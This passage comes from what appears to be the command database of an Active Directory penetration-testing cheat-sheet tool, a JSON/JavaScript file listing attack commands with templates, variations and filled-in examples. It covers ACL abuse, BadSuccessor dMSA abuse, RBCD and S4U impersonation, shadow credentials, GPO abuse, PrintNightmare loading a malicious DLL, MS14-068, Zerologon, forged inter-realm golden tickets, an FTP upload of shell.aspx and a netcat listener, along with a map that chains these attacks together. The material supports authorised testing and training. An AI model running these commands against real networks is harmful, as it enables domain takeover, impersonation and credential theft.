      "subcategory": "acl-abuse",
      "description": "Change the owner of an AD object (WriteOwner abuse)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "owner",
        "acl",
        "privilege-escalation",
        "write-owner"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target>' -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target>' -k -no-pass '<domain>/<user>' -dc-ip '<ip>'"
        }
      ],
      "examples": [
        "impacket-owneredit -action write -new-owner 'attacker' -target 'victim' 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
      ]
    },
    {
      "id": "nxc-ldap-badsuccessor",
      "name": "NetExec LDAP BadSuccessor",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M badsuccessor",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Check and exploit the BadSuccessor vulnerability via delegated Managed Service Accounts (dMSA)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "badsuccessor",
        "dmsa",
        "privilege-escalation",
        "acl"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M badsuccessor"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M badsuccessor"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M badsuccessor"
      ]
    },
    {
      "id": "nxc-ldap-daclread",
      "name": "NetExec LDAP DACL Read",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M daclread -o TARGET='<target>' ACTION=read",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Read DACL entries on an AD object to identify abusable ACL permissions",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "dacl",
        "acl",
        "enumeration",
        "privilege-escalation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M daclread -o TARGET='<target>' ACTION=read"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M daclread -o TARGET='<target>' ACTION=read"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M daclread -o TARGET='Domain Admins' ACTION=read"
      ]
    },
    {
      "id": "bloodyad-badsuccessor",
      "name": "bloodyAD add badSuccessor",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add badSuccessor '<dmsa-name>'",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Create a Delegated Managed Service Account (dMSA) and chain it via msDS-ManagedAccountPrecededByLink to a privileged target. The dMSA inherits the predecessor's keys/permissions on next logon — Server 2025 BadSuccessor abuse. Requires CreateChild on an OU.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "badsuccessor",
        "dmsa",
        "server-2025",
        "privesc"
      ],
      "references": [
        {
          "title": "BadSuccessor (Akamai)",
          "url": "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add badSuccessor pwndmsa"
      ]
    },
    {
      "id": "bloodyad-rbcd",
      "name": "bloodyAD Set RBCD",
      "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add rbcd <target_computer> <controlled_computer$>",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Configure Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer to allow a controlled machine account to S4U2Self/S4U2Proxy as any user against it. Classic privesc when you have GenericWrite on a server and a machine account (e.g. via add-computer + MAQ).",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "rbcd",
        "delegation",
        "s4u",
        "privesc"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> add rbcd <target_computer> <controlled_computer$>"
        },
        {
          "label": "Cleanup",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> remove rbcd <target_computer> <controlled_computer$>"
        }
      ],
      "references": [
        {
          "title": "bloodyAD docs",
          "url": "https://github.com/CravateRouge/bloodyAD/wiki"
        },
        {
          "title": "The Hacker Recipes — RBCD",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add rbcd 'TARGET$' 'PWNED$'",
        "impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator 'corp.local/PWNED$:ComputerPass123!'"
      ]
    },
    {
      "id": "addcomputer",
      "name": "Impacket Add Computer",
      "command": "impacket-addcomputer -method LDAPS -computer-name '<computer_name>$' -computer-pass '<computer_pass>' -dc-host <ip> '<domain>/<user>:<password>'",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Create a new computer account in Active Directory (used for RBCD attacks)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "addcomputer",
        "computer-account",
        "rbcd",
        "delegation",
        "ldaps"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-addcomputer -method LDAPS -computer-name '<computer_name>$' -computer-pass '<computer_pass>' -dc-host <ip> -hashes ':<hash>' '<domain>/<user>'"
        }
      ],
      "examples": [
        "impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 192.168.1.2 'corp.local/user:password'"
      ]
    },
    {
      "id": "getST-s4u",
      "name": "Impacket getST (S4U)",
      "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' '<domain>/<user>:<password>' -dc-ip <ip>",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Abuse constrained delegation or RBCD via S4U2Self/S4U2Proxy to impersonate a user",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "s4u",
        "delegation",
        "constrained",
        "rbcd",
        "impersonation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' -hashes ':<hash>' '<domain>/<user>' -dc-ip <ip>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' -k -no-pass '<domain>/<user>' -dc-ip <ip>"
        },
        {
          "label": "Alt-Service Swap",
          "requires": "hash",
          "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' -hashes ':<hash>' '<domain>/<user>' -dc-ip <ip> -altservice '<alt_service>'"
        }
      ],
      "examples": [
        "impacket-getST -spn 'cifs/dc01.corp.local' -impersonate 'administrator' 'corp.local/svc_account:password' -dc-ip 192.168.1.100"
      ]
    },
    {
      "id": "impacket-rbcd",
      "name": "Impacket RBCD Write",
      "command": "impacket-rbcd -dc-host <ip> -delegate-from '<computer>' -delegate-to '<target>' -action 'write' '<domain>/<user>:<password>'",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Write msDS-AllowedToActOnBehalfOfOtherIdentity to configure RBCD on a target",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "rbcd",
        "delegation",
        "resource-based",
        "constrained-delegation",
        "msds-allowedtoactonbehalfofotheridentity"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-rbcd -dc-host <ip> -delegate-from '<computer>' -delegate-to '<target>' -action 'write' -hashes ':<hash>' '<domain>/<user>'"
        },
        {
          "label": "Read (verify)",
          "requires": "password",
          "command": "impacket-rbcd -dc-host <ip> -delegate-from '<computer>' -delegate-to '<target>' -action 'read' '<domain>/<user>:<password>'"
        }
      ],
      "examples": [
        "impacket-rbcd -dc-host 192.168.1.2 -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'US-HELPDESK$' -action 'write' -hashes ':e53153fc2dc8d4c5a5839e46220717e5' 'corp.local/mgmtadmin'"
      ]
    },
    {
      "id": "nxc-badsuccessor",
      "name": "NetExec badsuccessor Module (dMSA Abuse)",
      "command": "nxc ldap <dc-ip> -u '<user>' -p '<password>' -M badsuccessor",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Detect BadSuccessor dMSA-link abuse: a Server 2025 delegated Managed Service Account whose msDS-ManagedAccountPrecededByLink points at a privileged user grants the dMSA's identity inheritance to anyone with write rights over it. Module flags vulnerable accounts and suggests the chain. Added in NetExec v1.5.0 (Dec 2025).",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "netexec",
        "nxc",
        "badsuccessor",
        "dmsa",
        "delegation",
        "server-2025"
      ],
      "references": [
        {
          "title": "BadSuccessor research",
          "url": "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory"
        }
      ],
      "examples": [
        "nxc ldap dc.corp.local -u jdoe -p 'Password123!' -M badsuccessor"
      ]
    },
    {
      "id": "pywhisker",
      "name": "PyWhisker Shadow Credentials",
      "command": "python3 pywhisker.py -d '<domain>' -u '<user>' -p '<password>' --target '<target_user>' --action add --dc-ip <ip>",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Add shadow credentials to a target account's msDS-KeyCredentialLink attribute",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "pywhisker",
        "shadow-credentials",
        "msds-keycredentiallink",
        "delegation",
        "pkinit"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "python3 pywhisker.py -d '<domain>' -u '<user>' --hashes ':<hash>' --target '<target_user>' --action add --dc-ip <ip>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "python3 pywhisker.py -d '<domain>' -u '<user>' -k --target '<target_user>' --action add --dc-ip <ip>"
        }
      ],
      "examples": [
        "python3 pywhisker.py -d 'corp.local' -u 'user' -p 'password' --target 'admin' --action add --dc-ip 192.168.1.100"
      ]
    },
    {
      "id": "rbcd-attack",
      "name": "RBCD Attack",
      "command": "python3 rbcd.py -delegate-from '<computer>' -delegate-to '<target>' -dc-ip <ip> '<domain>/<user>:<password>'",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Configure Resource-Based Constrained Delegation (RBCD) on a target computer",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "rbcd",
        "delegation",
        "resource-based",
        "constrained-delegation",
        "msds-allowedtoactonbehalfofotheridentity"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "python3 rbcd.py -delegate-from '<computer>' -delegate-to '<target>' -dc-ip <ip> -hashes ':<hash>' '<domain>/<user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "python3 rbcd.py -delegate-from '<computer>' -delegate-to '<target>' -dc-ip <ip> -k -no-pass '<domain>/<user>'"
        }
      ],
      "examples": [
        "python3 rbcd.py -delegate-from 'EVIL$' -delegate-to 'DC01$' -dc-ip 192.168.1.100 'corp.local/user:password'"
      ]
    },
    {
      "id": "rubeus-s4u",
      "name": "Rubeus S4U Delegation",
      "command": ".\\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:<target_user> /msdsspn:<service>/<target_host> /ptt",
      "category": "privilege-escalation",
      "subcategory": "delegation",
      "description": "Abuse constrained delegation via S4U on Windows using Rubeus",
      "platform": "windows",
      "requires": [
        "ticket"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "rubeus",
        "s4u",
        "delegation",
        "constrained",
        "windows",
        "impersonation"
      ],
      "examples": [
        ".\\Rubeus.exe s4u /user:svc_account /rc4:e19ccf75ee54e06b06a5907af13cef42 /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt"
      ]
    },
    {
      "id": "gpupdate-force",
      "name": "Force GPO Update",
      "command": "gpupdate /force",
      "category": "privilege-escalation",
      "subcategory": "gpo-abuse",
      "description": "Force Group Policy update",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "gpupdate",
        "gpo",
        "force"
      ],
      "examples": [
        "gpupdate /force"
      ]
    },
    {
      "id": "sharpgpo-abuse",
      "name": "SharpGPOAbuse Local Admin",
      "command": "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName '<gpo_name>'",
      "category": "privilege-escalation",
      "subcategory": "gpo-abuse",
      "description": "GPO abuse to add user as local admin",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "sharpgpoabuse",
        "gpo",
        "localadmin",
        "privilege"
      ],
      "references": [
        {
          "title": "SharpGPOAbuse Github",
          "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
        }
      ],
      "examples": [
        "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount 'lowpriv_user' --GPOName 'Default Domain Policy'"
      ]
    },
    {
      "id": "nxc-smb-enum-impersonate",
      "name": "NetExec SMB Enum Impersonate",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M enum_impersonate",
      "category": "privilege-escalation",
      "subcategory": "local-privesc",
      "description": "Enumerate tokens and privileges available for impersonation on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "impersonate",
        "tokens",
        "privilege-escalation",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M enum_impersonate"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M enum_impersonate"
      ]
    },
    {
      "id": "nxc-smb-ms17010",
      "name": "NetExec SMB MS17-010 (EternalBlue)",
      "command": "nxc smb '<ip>' -u '' -p '' -M ms17-010",
      "category": "privilege-escalation",
      "subcategory": "local-privesc",
      "description": "Check for MS17-010 (EternalBlue) vulnerability without credentials",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "ms17-010",
        "eternalblue",
        "cve-2017-0144",
        "unauthenticated",
        "privilege-escalation"
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u '' -p '' -M ms17-010"
      ]
    },
    {
      "id": "nxc-smb-printnightmare",
      "name": "NetExec SMB PrintNightmare",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M printnightmare -o DLL='\\\\<ip>\\share\\evil.dll'",
      "category": "privilege-escalation",
      "subcategory": "local-privesc",
      "description": "Exploit PrintNightmare (CVE-2021-1675/34527) to load a malicious DLL via the Print Spooler service",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "printnightmare",
        "cve-2021-1675",
        "cve-2021-34527",
        "print-spooler",
        "privilege-escalation"
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M printnightmare -o DLL='\\\\\\\\192.168.1.50\\\\share\\\\evil.dll'"
      ]
    },
    {
      "id": "nxc-smb-smbghost",
      "name": "NetExec SMB SMBGhost",
      "command": "nxc smb '<ip>' -u '' -p '' -M smbghost",
      "category": "privilege-escalation",
      "subcategory": "local-privesc",
      "description": "Check for SMBGhost (CVE-2020-0796) SMBv3 compression vulnerability without credentials",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "smbghost",
        "cve-2020-0796",
        "smbv3",
        "unauthenticated",
        "privilege-escalation"
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u '' -p '' -M smbghost"
      ]
    },
    {
      "id": "impacket-goldenPac",
      "name": "Impacket goldenPac (MS14-068)",
      "command": "impacket-goldenPac '<domain>/<user>:<password>@<dc_fqdn>'",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Exploit MS14-068 Kerberos privilege escalation to obtain Domain Admin via forged PAC",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "ms14-068",
        "goldenpac",
        "privilege-escalation",
        "kerberos",
        "pac"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-goldenPac -hashes ':<hash>' '<domain>/<user>@<dc_fqdn>'"
        }
      ],
      "examples": [
        "impacket-goldenPac 'CORP.LOCAL/user:password@dc01.corp.local'"
      ]
    },
    {
      "id": "lookupsid",
      "name": "Impacket LookupSID",
      "command": "impacket-lookupsid '<domain>/<user>:<password>'@<ip>",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Enumerate domain SIDs and discover trust relationships via SID brute-forcing",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "lookupsid",
        "sid",
        "trust",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-lookupsid -hashes ':<hash>' '<domain>/<user>'@<ip>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-lookupsid -k -no-pass '<domain>/<user>'@<ip>"
        }
      ],
      "examples": [
        "impacket-lookupsid 'corp.local/user:password'@192.168.1.100"
      ]
    },
    {
      "id": "impacket-raiseChild",
      "name": "Impacket raiseChild",
      "command": "impacket-raiseChild '<child_domain>/<user>:<password>' -target-exec '<ip>'",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Escalate from child domain DA to forest root DA via inter-realm Kerberos trust",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos",
        "ldap"
      ],
      "tags": [
        "impacket",
        "raisechild",
        "forest",
        "trust",
        "domain-escalation",
        "sid-history"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-raiseChild -hashes ':<hash>' '<child_domain>/<user>' -target-exec '<ip>'"
        }
      ],
      "examples": [
        "impacket-raiseChild 'child.corp.local/domainadmin:password' -target-exec '192.168.1.1'"
      ]
    },
    {
      "id": "inter-realm-golden",
      "name": "Inter-Realm Golden Ticket",
      "command": "impacket-ticketer -nthash '<trust_hash>' -domain-sid '<domain_sid>' -domain '<domain>' -extra-sid '<target_domain_sid>-519' -spn 'krbtgt/<target_domain>' '<user>'",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Forge a cross-domain Golden Ticket to escalate from child to parent domain",
      "platform": "linux",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "golden-ticket",
        "inter-realm",
        "trust",
        "sid-history",
        "cross-domain"
      ],
      "examples": [
        "impacket-ticketer -nthash 'aad3b435b51404eeaad3b435b51404ee' -domain-sid 'S-1-5-21-111111111-111111111-111111111' -domain 'child.corp.local' -extra-sid 'S-1-5-21-222222222-222222222-222222222-519' -spn 'krbtgt/corp.local' 'administrator'"
      ]
    },
    {
      "id": "ldapsearch-shadow-principal",
      "name": "LDAPSearch Shadow Principals (PAM Trust)",
      "command": "ldapsearch -H ldap://<ip> -Y GSSAPI -b 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,<dc_dn>' '(objectClass=msDS-ShadowPrincipal)' msDS-ShadowPrincipalSid member name",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Enumerate msDS-ShadowPrincipal objects to identify PAM trust shadow principals",
      "platform": "linux",
      "requires": [
        "ticket"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "ldapsearch",
        "ldap",
        "shadow-principal",
        "pam-trust",
        "trust",
        "enumeration"
      ],
      "examples": [
        "ldapsearch -H ldap://192.168.101.1 -Y GSSAPI -b 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local' '(objectClass=msDS-ShadowPrincipal)' msDS-ShadowPrincipalSid member name"
      ]
    },
    {
      "id": "nxc-ldap-raisechild",
      "name": "NetExec LDAP Raise Child",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M raisechild",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Escalate from child domain DA to forest root DA via inter-realm Kerberos trust abuse",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "nxc",
        "ldap",
        "raisechild",
        "forest",
        "trust",
        "privilege-escalation",
        "sid-history"
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'domainadmin' -p 'password' -M raisechild"
      ]
    },
    {
      "id": "nxc-smb-nopac",
      "name": "NetExec SMB NoPAC",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M nopac",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Check for and exploit the NoPAC (CVE-2021-42278/42287) Kerberos privilege escalation vulnerability",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "kerberos"
      ],
      "tags": [
        "nxc",
        "smb",
        "nopac",
        "cve-2021-42278",
        "cve-2021-42287",
        "privilege-escalation",
        "kerberos"
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M nopac"
      ]
    },
    {
      "id": "nxc-smb-zerologon",
      "name": "NetExec SMB Zerologon",
      "command": "nxc smb '<ip>' -u '' -p '' -M zerologon",
      "category": "privilege-escalation",
      "subcategory": "trust-attacks",
      "description": "Check for Zerologon (CVE-2020-1472) vulnerability — resets DC computer account password to empty",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "nxc",
        "smb",
        "zerologon",
        "cve-2020-1472",
        "privilege-escalation",
        "unauthenticated",
        "critical"
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u '' -p '' -M zerologon"
      ]
    },
    {
      "id": "impacket-smbserver",
      "name": "Impacket SMB Server",
      "command": "impacket-smbserver '<share_name>' '<share_path>' -smb2support",
      "category": "utilities",
      "subcategory": "file-transfer",
      "description": "Start an SMB server for file transfer to/from Windows targets",
      "platform": "linux",
      "requires": [
        "shell"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "smb",
        "file-transfer",
        "server",
        "utility"
      ],
      "examples": [
        "impacket-smbserver 'share' '.' -smb2support",
        "impacket-smbserver 'share' '/tmp/loot' -smb2support -username 'user' -password 'pass'"
      ]
    },
    {
      "id": "nxc-ftp-get",
      "name": "NetExec FTP Download",
      "command": "nxc ftp <target> -u '<user>' -p '<password>' --get <remote-file>",
      "category": "utilities",
      "subcategory": "file-transfer",
      "description": "Download a file from an FTP server. Saves to the current working directory with the original filename.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ftp"
      ],
      "tags": [
        "netexec",
        "nxc",
        "ftp",
        "download"
      ],
      "examples": [
        "nxc ftp 10.10.10.10 -u jdoe -p 'Password123!' --get backup.zip"
      ]
    },
    {
      "id": "nxc-ftp-put",
      "name": "NetExec FTP Upload",
      "command": "nxc ftp <target> -u '<user>' -p '<password>' --put <local-file>",
      "category": "utilities",
      "subcategory": "file-transfer",
      "description": "Upload a file to an FTP server. Useful for staging payloads on misconfigured anonymous-writable shares.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ftp"
      ],
      "tags": [
        "netexec",
        "nxc",
        "ftp",
        "upload"
      ],
      "variations": [
        {
          "label": "Anonymous",
          "requires": "no-creds",
          "command": "nxc ftp <target> -u 'anonymous' -p '' --put <local-file>"
        }
      ],
      "examples": [
        "nxc ftp 10.10.10.10 -u anonymous -p '' --put shell.aspx"
      ]
    },
    {
      "id": "python-http-server",
      "name": "Python HTTP Server",
      "command": "python3 -m http.server <port>",
      "category": "utilities",
      "subcategory": "file-transfer",
      "description": "Start a simple HTTP server for file transfer",
      "platform": "linux",
      "requires": [
        "shell"
      ],
      "protocols": [
        "http"
      ],
      "tags": [
        "python",
        "http",
        "file-transfer",
        "server",
        "utility"
      ],
      "examples": [
        "python3 -m http.server 8080",
        "python3 -m http.server 80"
      ]
    },
    {
      "id": "fix-time-skew",
      "name": "Fix Kerberos Time Skew",
      "command": "sudo timedatectl set-ntp off && sudo rdate -n <ip>",
      "category": "utilities",
      "subcategory": "network-setup",
      "description": "Fix time skew issues for Kerberos authentication",
      "platform": "linux",
      "requires": [],
      "protocols": [],
      "tags": [
        "time",
        "kerberos",
        "ntp",
        "sync"
      ],
      "examples": [
        "sudo timedatectl set-ntp off && sudo rdate -n 10.10.11.76"
      ]
    },
    {
      "id": "generate-hosts-file",
      "name": "NetExec Generate Hosts File",
      "command": "nxc smb ips.txt --generate-hosts-file hosts.txt && cat hosts.txt | sudo tee -a /etc/hosts",
      "category": "utilities",
      "subcategory": "network-setup",
      "description": "Generate hosts file and add them to /etc/hosts file",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "hosts",
        "dns",
        "setup"
      ],
      "examples": [
        "nxc smb 10.10.11.76 --generate-hosts-file hosts.txt && cat hosts.txt | sudo tee -a /etc/hosts"
      ]
    },
    {
      "id": "rlwrap",
      "name": "rlwrap Shell Wrapper",
      "command": "rlwrap <command>",
      "category": "utilities",
      "subcategory": "shell-helpers",
      "description": "Wrap a command with readline support for history and line editing",
      "platform": "linux",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "rlwrap",
        "readline",
        "shell",
        "utility",
        "wrapper"
      ],
      "examples": [
        "rlwrap nc -lvnp 443",
        "rlwrap impacket-mssqlclient 'corp.local/sa:password'@192.168.1.100"
      ]
    }
  ]
};

const COMMAND_LINKS = {
  "secretsdump": [
    "hashcat-ntlm",
    "evil-winrm",
    "golden-ticket"
  ],
  "kerberoasting": [
    "Cracking-Kerberoasting-hashes"
  ],
  "nxc-smb-auth": [
    "evil-winrm",
    "nxc-smb-shares"
  ],
  "targeted-kerberoast": [
    "Cracking-Kerberoasting-hashes"
  ],
  "gettgt-kerberoast": [
    "nxc-smb-auth"
  ],
  "gettgt-kerberoast-hash": [
    "nxc-smb-auth"
  ],
  "petitpotam": [
    "ntlmrelayx-smb",
    "ntlmrelayx-ldap",
    "ntlmrelayx-adcs",
    "certipy-relay"
  ],
  "coercer": [
    "ntlmrelayx-smb",
    "ntlmrelayx-ldap",
    "ntlmrelayx-adcs",
    "certipy-relay"
  ],
  "dfscoerce": [
    "ntlmrelayx-smb",
    "ntlmrelayx-ldap",
    "ntlmrelayx-adcs",
    "certipy-relay"
  ],
  "printerbug": [
    "ntlmrelayx-smb",
    "ntlmrelayx-ldap",
    "ntlmrelayx-adcs",
    "certipy-relay"
  ],
  "certipy-relay": [
    "certipy-req",
    "certipy-auth"
  ],
  "certipy-find": [
    "certipy-req"
  ],
  "certipy-req": [
    "certipy-auth"
  ],
  "certipy-auth": [
    "evil-winrm",
    "psexec"
  ],
  "certipy-shadow": [
    "certipy-auth"
  ],
  "responder": [
    "ntlmrelayx-smb",
    "ntlmrelayx-ldap",
    "ntlmrelayx-adcs"
  ],
  "ntlmrelayx-ldap": [
    "rbcd-attack",
    "getST-s4u"
  ],
  "ntlmrelayx-adcs": [
    "certipy-auth"
  ],
  "rbcd-attack": [
    "getST-s4u"
  ],
  "getST-s4u": [
    "psexec",
    "wmiexec",
    "secretsdump"
  ],
  "pywhisker": [
    "certipy-auth"
  ],
  "golden-ticket": [
    "psexec",
    "secretsdump"
  ],
  "silver-ticket": [
    "psexec",
    "secretsdump"
  ],
  "wmiexec": [
    "secretsdump"
  ],
  "dcomexec": [
    "secretsdump"
  ],
  "smbexec": [
    "secretsdump"
  ],
  "atexec": [
    "secretsdump"
  ],
  "nxc-ldap-adcs": [
    "certipy-find"
  ],
  "lookupsid": [
    "inter-realm-golden"
  ],
  "inter-realm-golden": [
    "psexec"
  ],
  "impacket-GetADUsers": [
    "bloodhound",
    "kerberoasting"
  ],
  "impacket-findDelegation": [
    "getST-s4u",
    "rbcd-attack"
  ],
  "impacket-goldenPac": [
    "psexec",
    "wmiexec"
  ],
  "impacket-raiseChild": [
    "psexec",
    "secretsdump"
  ],
  "impacket-badsuccessor": [
    "dacledit",
    "getST-s4u"
  ],
  "nxc-ldap-badsuccessor": [
    "dacledit",
    "getST-s4u"
  ],
  "dacledit": [
    "certipy-shadow",
    "getST-s4u"
  ],
  "owneredit": [
    "dacledit"
  ],
  "nxc-smb-backup-operator": [
    "secretsdump"
  ],
  "nxc-smb-nopac": [
    "psexec",
    "secretsdump"
  ],
  "nxc-smb-zerologon": [
    "secretsdump"
  ],
  "nxc-ldap-enum-trusts": [
    "lookupsid",
    "inter-realm-golden"
  ],
  "nxc-smb-timeroast": [
